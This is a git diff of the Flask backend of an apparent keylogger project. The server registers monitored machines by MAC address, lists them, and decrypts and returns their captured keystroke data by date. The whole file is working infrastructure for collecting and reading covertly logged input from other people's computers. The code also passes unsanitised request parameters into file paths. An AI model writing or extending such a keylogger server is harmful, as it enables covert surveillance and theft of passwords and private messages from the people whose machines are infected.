@@ -1,3 +1,4 @@
+import ast
 import os
 
 from flask import Flask, render_template, Blueprint, jsonify, request
@@ -11,8 +12,8 @@ from KEYLOGGER_PROJECT.Encrypt_Decrypt.decrypt_file import Decrypt
 
 
 
-with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'w') as f:
-    json.dump({'flask':True}, f)
+# with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'w') as f:
+#     json.dump({'flask':True}, f)
 
 
 app = Flask(__name__)
@@ -34,10 +35,15 @@ def login():
         return jsonify({'status':'access denied'}), 400
 
 
+@app.route('/get_macs', methods=['GET'])
+def send_macs():
+    macs = [ name.replace('-', ':').replace('_info','') for name in os.listdir(r'C:\Users\User\Desktop/keylogger_data') if os.path.isdir(os.path.join(r'C:\Users\User\Desktop/keylogger_data', name))]
+    return jsonify(macs), 200
+
+
 @app.route('/get_by_mac', methods=['GET'])
 def get_by_mac():
     mac_address = request.args['mac']
-    print(mac_address)
     try:
         with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
             dic_mac = json.loads(f.read())
@@ -50,31 +56,20 @@ def get_by_mac():
         return jsonify({'status':'mac not available'}), 400
 
 
-@app.route('/get_by_mac/get_by_date', methods=['GET'])
+@app.route('/get_by_date', methods=['GET'])
 def get_by_date():
-    date = request.args['date']
+    date = request.args.get('date')
+    mac = request.args.get('mac')
+    key = Decrypt.get_key(mac)
+    path = fr'C:\Users\User\Desktop/keylogger_data/{mac.replace(':', '-')}_info/{date}'
     try:
-        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
-            for mac in f:
-                if mac == date:
-                    files = os.listdir(fr'C:\Users\User\Desktop\keylogger_data\{mac.replace(':', '-')}_info')
-                    return files, 200
-        return jsonify({'status': 'mac not available'}), 400
-    except:
-        return jsonify({'status':'mac not available'}), 400
-
-
-@app.route('/', methods=['GET'])
-def hello():
-    mac_address = request.args['mac']
-    date_input = request.args['date']
-    with open(fr"C:\Users\User\Desktop\{mac_address.replace(':','-')}.json", 'rb') as f:
-        try:
-            key=Decrypt.get_key(mac_address)
-            dic = dict(Decrypt.decrypt_data(f.read(), key))[mac_address][date_input]
-            return str(dic)
-        except Exception as e:
-            return jsonify({'invalid mac address': e})
+        with open(path, 'r') as f:
+            file_data = f.read()
+            byte_value = ast.literal_eval(file_data)
+            decrypted_data = Decrypt.decrypt_data(byte_value, key)
+            return jsonify(decrypted_data), 200
+    except Exception:
+        return jsonify({'status':'date not available'}), 400
 
 
 @app.route('/add_data', methods=['POST'])
@@ -96,16 +91,21 @@ def add_data():
 
 @app.route('/send_mac', methods=['POST'])
 def send_mac():
+    ''' get the mac '''
     mac = request.data
+    dict_f= {}
+    ''' add the mac to all addresses file '''
+    with open(r'C:\Users\User\Desktop/keylogger_data/Mac_addresses.json', 'a') as f:
+        f.write(mac.decode() + '\n')
     try:
         with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
             dict_f = json.loads(f.read())
+    except:
+        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'w') as f:
             dict_f[mac.decode()] = True
-            with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'w') as file:
-                json.dump(dict_f, file)
-        return jsonify({'post':'successful'}), 200
-    except Exception as e:
-        print(e)
+            json.dump(dict_f, f)
+
+    return jsonify({'post':'successful'}), 200
 
 
 @app.route('/check_status', methods=['GET'])
@@ -121,7 +121,6 @@ def check_status():
         # print(e)
         pass
     return jsonify({'exit': False}), 200
-
 
 
 
